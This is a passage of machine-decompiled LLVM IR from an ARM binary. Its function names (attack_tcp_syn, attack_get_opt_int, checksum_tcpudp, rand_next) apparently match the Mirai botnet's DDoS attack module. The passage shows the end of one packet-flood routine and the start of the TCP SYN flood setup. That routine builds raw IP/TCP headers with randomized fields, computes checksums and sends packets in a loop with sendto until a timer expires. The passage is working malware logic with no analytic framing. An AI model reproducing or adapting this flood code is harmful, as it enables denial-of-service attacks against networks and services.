dec_label_pc_c0dc:                                ; preds = %dec_label_pc_c234.dec_label_pc_c0dc_crit_edge, %dec_label_pc_c0d0
  %v1_c0e0 = phi i32 [ %v1_c0e0.pre, %dec_label_pc_c234.dec_label_pc_c0dc_crit_edge ], [ %v1_c0d4, %dec_label_pc_c0d0 ]
  store i32 %v3_be34, i32* %r3.global-to-local, align 4
  %v9_c0e0 = icmp eq i32 %v3_be34, %v1_c0e0
  store i1 %v9_c0e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c0e0, label %dec_label_pc_c25c, label %dec_label_pc_c0e8

dec_label_pc_c0e8:                                ; preds = %dec_label_pc_c248.dec_label_pc_c0e8_crit_edge, %dec_label_pc_c0dc
  %v1_c0ec = phi i32 [ %v1_c0ec.pre, %dec_label_pc_c248.dec_label_pc_c0e8_crit_edge ], [ %v1_c0e0, %dec_label_pc_c0dc ]
  store i32 %v5_bcbc, i32* %ip.global-to-local, align 4
  %v9_c0ec = icmp eq i32 %v5_bcbc, %v1_c0ec
  store i1 %v9_c0ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c0ec, label %dec_label_pc_c270, label %dec_label_pc_c0f4

dec_label_pc_c0f4:                                ; preds = %dec_label_pc_c25c.dec_label_pc_c0f4_crit_edge, %dec_label_pc_c0e8
  %v1_c0f8 = phi i32 [ %v1_c0f8.pre, %dec_label_pc_c25c.dec_label_pc_c0f4_crit_edge ], [ %v1_c0ec, %dec_label_pc_c0e8 ]
  store i32 %v6_bcd8, i32* %r0.global-to-local, align 4
  %v9_c0f8 = icmp eq i32 %v6_bcd8, %v1_c0f8
  store i1 %v9_c0f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c0f8, label %dec_label_pc_c284, label %dec_label_pc_c100

dec_label_pc_c100:                                ; preds = %dec_label_pc_c270, %dec_label_pc_c0f4
  store i32 %v1_bda8, i32* %r1.global-to-local, align 4
  store i1 %v2_c28c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c28c, label %dec_label_pc_c10c, label %dec_label_pc_c298

dec_label_pc_c10c:                                ; preds = %dec_label_pc_c100, %dec_label_pc_c284, %dec_label_pc_c298
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_c110 = load i32, i32* @r5, align 4
  %v3_c110 = add i32 %v2_c110, 10
  %v4_c110 = inttoptr i32 %v3_c110 to i16*
  store i16 0, i16* %v4_c110, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_c118 = load i32, i32* @r5, align 4
  store i32 %v0_c118, i32* @r0, align 4
  %v2_c11c = call i32 @checksum_generic(i32 %v0_c118, i32 20)
  %v3_c11c = trunc i32 %v2_c11c to i16
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_c124 = load i32, i32* @r5, align 4
  %v4_c124 = add i32 %v3_c124, 10
  %v5_c124 = inttoptr i32 %v4_c124 to i16*
  store i16 %v3_c11c, i16* %v5_c124, align 2
  %v0_c128 = load i32, i32* @r6, align 4
  store i32 %v0_c128, i32* @r1, align 4
  %v0_c12c = load i32, i32* %r3.global-to-local, align 4
  %v1_c12c = trunc i32 %v0_c12c to i16
  %v3_c12c = add i32 %v0_c128, 16
  %v4_c12c = inttoptr i32 %v3_c12c to i16*
  store i16 %v1_c12c, i16* %v4_c12c, align 2
  %v0_c130 = load i32, i32* @fp, align 4
  store i32 %v0_c130, i32* %r2.global-to-local, align 4
  %v0_c134 = load i32, i32* @sb, align 4
  store i32 %v0_c134, i32* %r3.global-to-local, align 4
  %v0_c138 = load i32, i32* @r5, align 4
  store i32 %v0_c138, i32* %r0.global-to-local, align 4
  %v4_c13c = call i32 @checksum_tcpudp(i32 %v0_c138, i32 %v0_c128, i32 %v0_c130, i32 %v0_c134)
  %v5_c13c = trunc i32 %v4_c13c to i16
  store i32 %v4_c13c, i32* %r0.global-to-local, align 4
  %v3_c140 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c140, i32* %r3.global-to-local, align 4
  %v3_c144 = mul i32 %v3_c140, 32
  store i32 %v3_c144, i32* %lr.global-to-local, align 4
  %v3_c148 = load i32, i32* @r6, align 4
  %v4_c148 = add i32 %v3_c148, 16
  %v5_c148 = inttoptr i32 %v4_c148 to i16*
  store i16 %v5_c13c, i16* %v5_c148, align 2
  %v0_c14c = load i32, i32* %lr.global-to-local, align 4
  %v1_c14c = load i32, i32* %r3.global-to-local, align 4
  %tmp73 = mul i32 %v1_c14c, -8
  %v5_c14c = add i32 %v0_c14c, %tmp73
  store i32 %v5_c14c, i32* %lr.global-to-local, align 4
  %v0_c150 = load i32, i32* @r6, align 4
  %v1_c150 = add i32 %v0_c150, 2
  %v2_c150 = inttoptr i32 %v1_c150 to i16*
  %v3_c150 = load i16, i16* %v2_c150, align 2
  %v4_c150 = zext i16 %v3_c150 to i32
  store i32 %v4_c150, i32* @r6, align 4
  %v1_c154 = load i32, i32* @r7, align 4
  %v2_c154 = add i32 %v1_c154, %v5_c14c
  store i32 %v2_c154, i32* @lr, align 4
  %v3_c158 = add i32 %v2_c154, 2
  %v4_c158 = inttoptr i32 %v3_c158 to i16*
  store i16 %v3_c150, i16* %v4_c158, align 2
  store i32 16, i32* %ip.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_c164 = load i32, i32* @r5, align 4
  store i32 %v0_c164, i32* %r1.global-to-local, align 4
  store i32 %v3_bde0, i32* %r0.global-to-local, align 4
  %v0_c16c = load i32, i32* @sl, align 4
  store i32 %v0_c16c, i32* %r2.global-to-local, align 4
  %v0_c174 = load i32, i32* @lr, align 4
  %v6_c178 = call i32 @__libc_sendto(i32 %v3_bde0, i32 %v0_c164, i32 %v0_c16c, i32 16384, i32 %v0_c174, i32 16)
  %v3_c17c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c17c, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  %v1_c184 = add i32 %v3_c17c, 1
  store i32 %v1_c184, i32* %r0.global-to-local, align 4
  %v9_c188 = icmp eq i32 %v1_c184, %arg2
  store i1 %v9_c188, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c184, i32* %stack_var_-44, align 4
  %v6_c190 = icmp slt i32 %v1_c184, %arg2
  br i1 %v6_c190, label %dec_label_pc_c194, label %dec_label_pc_c2b4

dec_label_pc_c194:                                ; preds = %dec_label_pc_c10c, %dec_label_pc_c08c
  %v1_c1a8 = phi i32 [ %v1_c184, %dec_label_pc_c10c ], [ 0, %dec_label_pc_c08c ]
  %v5_c198 = mul i32 %v1_c1a8, 24
  %v1_c19c = load i32, i32* @r7, align 4
  %v2_c19c = add i32 %v1_c19c, %v5_c198
  store i32 %v2_c19c, i32* %r3.global-to-local, align 4
  store i32 %v2_bbec, i32* %ip.global-to-local, align 4
  %v1_c1a4 = add i32 %v2_c19c, 20
  %v2_c1a4 = inttoptr i32 %v1_c1a4 to i8*
  %v3_c1a4 = load i8, i8* %v2_c1a4, align 1
  %v4_c1a4 = zext i8 %v3_c1a4 to i32
  store i32 %v4_c1a4, i32* %r2.global-to-local, align 4
  %v4_c1a8 = mul i32 %v1_c1a8, 4
  %v5_c1a8 = add i32 %v4_c1a8, %v2_bbec
  %v6_c1a8 = inttoptr i32 %v5_c1a8 to i32*
  %v7_c1a8 = load i32, i32* %v6_c1a8, align 4
  store i32 %v7_c1a8, i32* @r5, align 4
  %v2_c1ac = icmp ugt i8 %v3_c1a4, 30
  %v7_c1ac = icmp eq i8 %v3_c1a4, 31
  store i1 %v7_c1ac, i1* %cpsr_z.global-to-local, align 1
  %v1_c1b0 = add i32 %v7_c1a8, 20
  store i32 %v1_c1b0, i32* @r6, align 4
  %v2_c1b4 = xor i1 %v7_c1ac, true
  %v3_c1b4 = and i1 %v2_c1ac, %v2_c1b4
  br i1 %v3_c1b4, label %dec_label_pc_c0b0, label %dec_label_pc_c1b8

dec_label_pc_c1b8:                                ; preds = %dec_label_pc_c194
  %v1_c1b8 = add i32 %v2_c19c, 16
  %v2_c1b8 = inttoptr i32 %v1_c1b8 to i32*
  %v3_c1b8 = load i32, i32* %v2_c1b8, align 4
  %v0_c1bc = call i32 @rand_next()
  store i32 %v0_c1bc, i32* %r0.global-to-local, align 4
  %v3_c1c0 = load i32, i32* %stack_var_-44, align 4
  %v5_c1c8 = mul i32 %v3_c1c0, 24
  %v1_c1cc = and i32 %v3_c1b8, 16711680
  store i32 %v1_c1cc, i32* %ip.global-to-local, align 4
  %v3_c1d0 = udiv i32 %v3_c1b8, 16777216
  %v4_c1d4 = udiv i32 %v1_c1cc, 256
  %v5_c1d4 = or i32 %v4_c1d4, %v3_c1d0
  store i32 %v5_c1d4, i32* %r2.global-to-local, align 4
  %v1_c1d8 = load i32, i32* @r7, align 4
  %v2_c1d8 = add i32 %v1_c1d8, %v5_c1c8
  store i32 %v2_c1d8, i32* %r1.global-to-local, align 4
  %v1_c1dc = and i32 %v3_c1b8, 65280
  store i32 %v1_c1dc, i32* %r3.global-to-local, align 4
  %v1_c1e0 = add i32 %v2_c1d8, 20
  %v2_c1e0 = inttoptr i32 %v1_c1e0 to i8*
  %v3_c1e0 = load i8, i8* %v2_c1e0, align 1
  %v4_c1e0 = zext i8 %v3_c1e0 to i32
  store i32 %v4_c1e0, i32* %ip.global-to-local, align 4
  %v5_c1e8 = call i32 @llvm.bswap.i32(i32 %v3_c1b8)
  %v7_c1ec = lshr i32 %v0_c1bc, %v4_c1e0
  %v8_c1ec = add i32 %v7_c1ec, %v5_c1e8
  store i32 %v8_c1ec, i32* %r2.global-to-local, align 4
  %v1_c1fc = and i32 %v8_c1ec, 65280
  store i32 %v1_c1fc, i32* %r1.global-to-local, align 4
  store i32 %v6_bdbc, i32* %r0.global-to-local, align 4
  %v5_c208 = call i32 @llvm.bswap.i32(i32 %v8_c1ec)
  store i32 %v5_c208, i32* %r3.global-to-local, align 4
  store i1 %v7_c0b4, i1* %cpsr_z.global-to-local, align 1
  %v1_c210 = load i32, i32* @r5, align 4
  %v2_c210 = add i32 %v1_c210, 16
  %v3_c210 = inttoptr i32 %v2_c210 to i32*
  store i32 %v5_c208, i32* %v3_c210, align 4
  br i1 %v2_c0b4, label %dec_label_pc_c218, label %dec_label_pc_c0bc

dec_label_pc_c218:                                ; preds = %dec_label_pc_c1b8, %dec_label_pc_c0b0
  %v0_c218 = call i32 @rand_next()
  store i32 %v0_c218, i32* %r0.global-to-local, align 4
  store i32 %v3_be2c, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1), i32* @r4, align 4
  store i1 %v9_c228, i1* %cpsr_z.global-to-local, align 1
  %v1_c22c = load i32, i32* @r5, align 4
  %v2_c22c = add i32 %v1_c22c, 12
  %v3_c22c = inttoptr i32 %v2_c22c to i32*
  store i32 %v0_c218, i32* %v3_c22c, align 4
  br i1 %v9_c228, label %dec_label_pc_c234, label %dec_label_pc_c218.dec_label_pc_c0d0_crit_edge

dec_label_pc_c218.dec_label_pc_c0d0_crit_edge:    ; preds = %dec_label_pc_c218
  %v1_c0d4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c0d0

dec_label_pc_c234:                                ; preds = %dec_label_pc_c218, %dec_label_pc_c0bc
  %v0_c234 = call i32 @rand_next()
  %v1_c234 = trunc i32 %v0_c234 to i16
  store i32 %v0_c234, i32* %r0.global-to-local, align 4
  store i32 %v3_be30, i32* %r2.global-to-local, align 4
  %v1_c23c = load i32, i32* @r4, align 4
  %v9_c23c = icmp eq i32 %v3_be30, %v1_c23c
  store i1 %v9_c23c, i1* %cpsr_z.global-to-local, align 1
  %v3_c240 = load i32, i32* @r5, align 4
  %v4_c240 = add i32 %v3_c240, 4
  %v5_c240 = inttoptr i32 %v4_c240 to i16*
  store i16 %v1_c234, i16* %v5_c240, align 2
  br i1 %v9_c23c, label %dec_label_pc_c248, label %dec_label_pc_c234.dec_label_pc_c0dc_crit_edge

dec_label_pc_c234.dec_label_pc_c0dc_crit_edge:    ; preds = %dec_label_pc_c234
  %v1_c0e0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c0dc

dec_label_pc_c248:                                ; preds = %dec_label_pc_c234, %dec_label_pc_c0d0
  %v0_c248 = call i32 @rand_next()
  %v1_c248 = trunc i32 %v0_c248 to i16
  store i32 %v0_c248, i32* %r0.global-to-local, align 4
  store i32 %v3_be34, i32* %r3.global-to-local, align 4
  %v1_c250 = load i32, i32* @r4, align 4
  %v9_c250 = icmp eq i32 %v3_be34, %v1_c250
  store i1 %v9_c250, i1* %cpsr_z.global-to-local, align 1
  %v3_c254 = load i32, i32* @r5, align 4
  %v4_c254 = add i32 %v3_c254, 20
  %v5_c254 = inttoptr i32 %v4_c254 to i16*
  store i16 %v1_c248, i16* %v5_c254, align 2
  br i1 %v9_c250, label %dec_label_pc_c25c, label %dec_label_pc_c248.dec_label_pc_c0e8_crit_edge

dec_label_pc_c248.dec_label_pc_c0e8_crit_edge:    ; preds = %dec_label_pc_c248
  %v1_c0ec.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c0e8

dec_label_pc_c25c:                                ; preds = %dec_label_pc_c248, %dec_label_pc_c0dc
  %v0_c25c = call i32 @rand_next()
  %v1_c25c = trunc i32 %v0_c25c to i16
  store i32 %v0_c25c, i32* %r0.global-to-local, align 4
  store i32 %v5_bcbc, i32* %ip.global-to-local, align 4
  %v1_c264 = load i32, i32* @r4, align 4
  %v9_c264 = icmp eq i32 %v5_bcbc, %v1_c264
  store i1 %v9_c264, i1* %cpsr_z.global-to-local, align 1
  %v3_c268 = load i32, i32* @r6, align 4
  %v4_c268 = add i32 %v3_c268, 2
  %v5_c268 = inttoptr i32 %v4_c268 to i16*
  store i16 %v1_c25c, i16* %v5_c268, align 2
  br i1 %v9_c264, label %dec_label_pc_c270, label %dec_label_pc_c25c.dec_label_pc_c0f4_crit_edge

dec_label_pc_c25c.dec_label_pc_c0f4_crit_edge:    ; preds = %dec_label_pc_c25c
  %v1_c0f8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c0f4

dec_label_pc_c270:                                ; preds = %dec_label_pc_c25c, %dec_label_pc_c0e8
  %v0_c270 = call i32 @rand_next()
  %v1_c274 = load i32, i32* @r6, align 4
  %v2_c274 = add i32 %v1_c274, 4
  %v3_c274 = inttoptr i32 %v2_c274 to i32*
  store i32 %v0_c270, i32* %v3_c274, align 4
  store i32 %v6_bcd8, i32* %r0.global-to-local, align 4
  %v1_c27c = load i32, i32* @r4, align 4
  %v9_c27c = icmp eq i32 %v6_bcd8, %v1_c27c
  store i1 %v9_c27c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c27c, label %dec_label_pc_c284, label %dec_label_pc_c100

dec_label_pc_c284:                                ; preds = %dec_label_pc_c270, %dec_label_pc_c0f4
  %v0_c284 = call i32 @rand_next()
  store i32 %v0_c284, i32* %r0.global-to-local, align 4
  store i32 %v1_bda8, i32* %r1.global-to-local, align 4
  store i1 %v2_c28c, i1* %cpsr_z.global-to-local, align 1
  %v1_c290 = load i32, i32* @r6, align 4
  %v2_c290 = add i32 %v1_c290, 8
  %v3_c290 = inttoptr i32 %v2_c290 to i32*
  store i32 %v0_c284, i32* %v3_c290, align 4
  br i1 %v2_c28c, label %dec_label_pc_c10c, label %dec_label_pc_c298

dec_label_pc_c298:                                ; preds = %dec_label_pc_c100, %dec_label_pc_c284
  %v0_c298 = load i32, i32* @r5, align 4
  %v1_c298 = add i32 %v0_c298, 40
  store i32 %v1_c298, i32* @r4, align 4
  store i32 %v1_c298, i32* %r0.global-to-local, align 4
  %v0_c2a0 = load i32, i32* @r8, align 4
  store i32 %v0_c2a0, i32* %r1.global-to-local, align 4
  %v2_c2a4 = call i32 @rand_alphastr(i32 %v1_c298, i32 %v0_c2a0)
  store i32 %v2_c2a4, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c2ac = load i32, i32* @r4, align 4
  %v3_c2ac = load i32, i32* @r8, align 4
  %v4_c2ac = add i32 %v3_c2ac, %v2_c2ac
  %v5_c2ac = inttoptr i32 %v4_c2ac to i8*
  store i8 0, i8* %v5_c2ac, align 1
  br label %dec_label_pc_c10c

dec_label_pc_c2b4:                                ; preds = %dec_label_pc_c10c, %dec_label_pc_c078
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_c2b8 = call i32 @__GI_time(i32* null)
  store i32 %v2_c2b8, i32* %r0.global-to-local, align 4
  store i32 %v2_bdcc, i32* %r1.global-to-local, align 4
  %v9_c2c0 = icmp eq i32 %v2_bdcc, %v2_c2b8
  store i1 %v9_c2c0, i1* %cpsr_z.global-to-local, align 1
  %v6_c2c4 = icmp slt i32 %v2_bdcc, %v2_c2b8
  br i1 %v6_c2c4, label %dec_label_pc_c2c8, label %dec_label_pc_c078

dec_label_pc_c2c8:                                ; preds = %dec_label_pc_c2b4, %entry, %dec_label_pc_c2d4
  %v1_c2d0 = phi i32 [ %v3_bde0, %entry ], [ %v1_c2d8, %dec_label_pc_c2d4 ], [ %v2_c2b8, %dec_label_pc_c2b4 ]
  store i32 %v18_bbc0, i32* %sb.global-to-local, align 4
  store i32 %v24_bbc0, i32* %fp.global-to-local, align 4
  store i32 %v27_bbc0, i32* %lr.global-to-local, align 4
  ret i32 %v1_c2d0

dec_label_pc_c2d4:                                ; preds = %dec_label_pc_bdf0
  store i32 %v3_bde0, i32* %r0.global-to-local, align 4
  %v1_c2d8 = call i32 @__GI___libc_close(i32 %v3_bde0)
  store i32 %v1_c2d8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c2c8

; uselistorder directives
  uselistorder i32 %v1_c2d8, { 1, 0 }
  uselistorder i32 %v0_c25c, { 1, 0 }
  uselistorder i32 %v0_c248, { 1, 0 }
  uselistorder i32 %v0_c234, { 1, 0 }
  uselistorder i32 %v5_c208, { 1, 0 }
  uselistorder i32 %v3_c1b8, { 2, 1, 3, 0 }
  uselistorder i32 %v1_c184, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v5_c14c, { 1, 0 }
  uselistorder i32 %v4_c13c, { 1, 0 }
  uselistorder i32 %v0_c08c, { 2, 1, 0 }
  uselistorder i1 %v2_c28c, { 2, 3, 1, 0 }
  uselistorder i1 %v9_c228, { 2, 3, 1, 0 }
  uselistorder i1 %v7_c0b4, { 2, 1, 0 }
  uselistorder i32 %v1_c064, { 1, 0, 2, 3 }
  uselistorder i32 %v0_c034, { 1, 0 }
  uselistorder i32 %v0_bfa0, { 1, 0, 2, 3 }
  uselistorder i32 %v1_bec8, { 2, 0, 1 }
  uselistorder i32 %v1_bec4, { 2, 0, 1 }
  uselistorder i32 %v1_beb4, { 1, 0 }
  uselistorder i1 %v2_be38, { 1, 0, 2, 3 }
  uselistorder i32 %v3_be2c, { 1, 2, 0, 3 }
  uselistorder i32 %v0_be28, { 1, 0, 3, 2 }
  uselistorder i32 %v0_be24, { 1, 0, 2 }
  uselistorder i1 %v7_be10, { 1, 0 }
  uselistorder i1 %v7_bde4, { 1, 0 }
  uselistorder i32 %v3_bde0, { 3, 4, 1, 5, 6, 2, 0, 7 }
  uselistorder i32 %v2_bdcc, { 2, 1, 0 }
  uselistorder i32 %v6_bdbc, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_bda8, { 2, 1, 3, 4, 0 }
  uselistorder i32 %v6_bd20, { 0, 2, 1 }
  uselistorder i32 %v6_bcd8, { 3, 2, 1, 0 }
  uselistorder i32 %v5_bcbc, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_bc6c, { 1, 0 }
  uselistorder i32 %v1_bc48, { 1, 0 }
  uselistorder i32 %v6_bc40, { 1, 0 }
  uselistorder i32 %v7_bc28, { 1, 0, 2, 3 }
  uselistorder i8 %v5_bc24, { 1, 0 }
  uselistorder i32 %v6_bc04, { 1, 0 }
  uselistorder i32 %v2_bbec, { 0, 4, 1, 3, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 13, 5, 6, 7, 8, 9, 10, 11, 12, 14, 15, 17, 16, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 8, 4, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 28, 27, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 41, 40, 42, 43, 44, 45, 47, 46, 49, 48, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 7, 5, 8, 6, 9, 10, 11, 13, 12, 15, 14, 16, 18, 17, 19, 20, 21, 23, 22, 29, 24, 25, 26, 27, 28, 30, 31, 32, 33, 35, 34, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 6, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 16, 8, 9, 10, 11, 12, 13, 14, 15, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32 %arg2, { 6, 5, 4, 7, 3, 2, 1, 0, 8, 9, 10, 11 }
  uselistorder label %dec_label_pc_c2c8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_c298, { 1, 0 }
  uselistorder label %dec_label_pc_c10c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_c078, { 1, 0 }
  uselistorder label %.thread10, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @attack_tcp_syn(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_c2e4 = load i32, i32* @r4, align 4
  %v24_c2e4 = load i32, i32* @fp, align 4
  %v27_c2e4 = load i32, i32* @lr, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* @sb, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg5, i32* @r4, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_c310 = call i32 @calloc(i32 %arg2, i32 4)
  %v0_c314 = load i32, i32* @r4, align 4
  store i32 %v0_c314, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_c310, i32* @sl, align 4
  %v0_c324 = load i32, i32* @r5, align 4
  store i32 %v0_c324, i32* %r0.global-to-local, align 4
  %v4_c328 = inttoptr i32 %v0_c314 to i32*
  %v5_c328 = call i32 @attack_get_opt_int(i32 %v0_c324, i32* %v4_c328, i32 2, i32 0)
  store i32 add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_c340 = load i32, i32* @r4, align 4
  store i32 %v0_c340, i32* %r1.global-to-local, align 4
  %v0_c344 = load i32, i32* @r5, align 4
  store i32 %v0_c344, i32* %r0.global-to-local, align 4
  %v5_c348 = trunc i32 %v5_c328 to i8
  %v6_c34c = inttoptr i32 %v0_c340 to i32*
  %v7_c34c = call i32 @attack_get_opt_int(i32 %v0_c344, i32* %v6_c34c, i32 3, i32 add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1))
  %v0_c350 = load i32, i32* @r4, align 4
  store i32 %v0_c350, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_c360 = load i32, i32* @r5, align 4
  store i32 %v0_c360, i32* %r0.global-to-local, align 4
  %v5_c364 = inttoptr i32 %v0_c350 to i32*
  %v6_c364 = call i32 @attack_get_opt_int(i32 %v0_c360, i32* %v5_c364, i32 4, i32 64)
  %v1_c36c = urem i32 %v6_c364, 256
  %v0_c370 = load i32, i32* @r4, align 4
  store i32 %v0_c370, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_c37c = load i32, i32* @r5, align 4
  store i32 %v0_c37c, i32* %r0.global-to-local, align 4
  %v6_c384 = inttoptr i32 %v0_c370 to i32*
  %v7_c384 = call i32 @attack_get_opt_int(i32 %v0_c37c, i32* %v6_c384, i32 5, i32 1)
  %v1_c390 = urem i32 %v7_c384, 256
  store i32 add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_c39c = load i32, i32* @r4, align 4
  store i32 %v0_c39c, i32* %r1.global-to-local, align 4
  %v0_c3a0 = load i32, i32* @r5, align 4
  store i32 %v0_c3a0, i32* %r0.global-to-local, align 4
  %v5_c3a8 = inttoptr i32 %v0_c39c to i32*
  %v6_c3a8 = call i32 @attack_get_opt_int(i32 %v0_c3a0, i32* %v5_c3a8, i32 6, i32 add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1))
  %v0_c3b4 = load i32, i32* @r4, align 4
  store i32 %v0_c3b4, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_c3c0 = load i32, i32* @r5, align 4
  store i32 %v0_c3c0, i32* %r0.global-to-local, align 4
  %v5_c3c4 = inttoptr i32 %v0_c3b4 to i32*
  %v6_c3c4 = call i32 @attack_get_opt_int(i32 %v0_c3c0, i32* %v5_c3c4, i32 7, i32 add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1))
  %v0_c3cc = load i32, i32* @r4, align 4
  store i32 %v0_c3cc, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 %v6_c3c4, i32* %fp.global-to-local, align 4
  %v0_c3dc = load i32, i32* @r5, align 4
  store i32 %v0_c3dc, i32* %r0.global-to-local, align 4
  %v4_c3e0 = inttoptr i32 %v0_c3cc to i32*
  %v5_c3e0 = call i32 @attack_get_opt_int(i32 %v0_c3dc, i32* %v4_c3e0, i32 16, i32 add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1))
  %v0_c3e4 = load i32, i32* @r4, align 4
  store i32 %v0_c3e4, i32* %r1.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c3f4 = load i32, i32* @r5, align 4
  store i32 %v0_c3f4, i32* %r0.global-to-local, align 4
  %v5_c3f8 = inttoptr i32 %v0_c3e4 to i32*
  %v6_c3f8 = call i32 @attack_get_opt_int(i32 %v0_c3f4, i32* %v5_c3f8, i32 17, i32 0)
  %v0_c3fc = load i32, i32* @r4, align 4
  store i32 %v0_c3fc, i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c40c = load i32, i32* @r5, align 4
  store i32 %v0_c40c, i32* %r0.global-to-local, align 4
  %v5_c410 = inttoptr i32 %v0_c3fc to i32*
  %v6_c410 = call i32 @attack_get_opt_int(i32 %v0_c40c, i32* %v5_c410, i32 10, i32 0)
  %v0_c414 = load i32, i32* @r4, align 4
  store i32 %v0_c414, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c424 = load i32, i32* @r5, align 4
  store i32 %v0_c424, i32* %r0.global-to-local, align 4
  %v5_c428 = inttoptr i32 %v0_c414 to i32*
  %v6_c428 = call i32 @attack_get_opt_int(i32 %v0_c424, i32* %v5_c428, i32 11, i32 0)
  %v0_c42c = load i32, i32* @r4, align 4
  store i32 %v0_c42c, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c43c = load i32, i32* @r5, align 4
  store i32 %v0_c43c, i32* %r0.global-to-local, align 4
  %v5_c440 = inttoptr i32 %v0_c42c to i32*
  %v6_c440 = call i32 @attack_get_opt_int(i32 %v0_c43c, i32* %v5_c440, i32 12, i32 0)
  %v0_c444 = load i32, i32* @r4, align 4
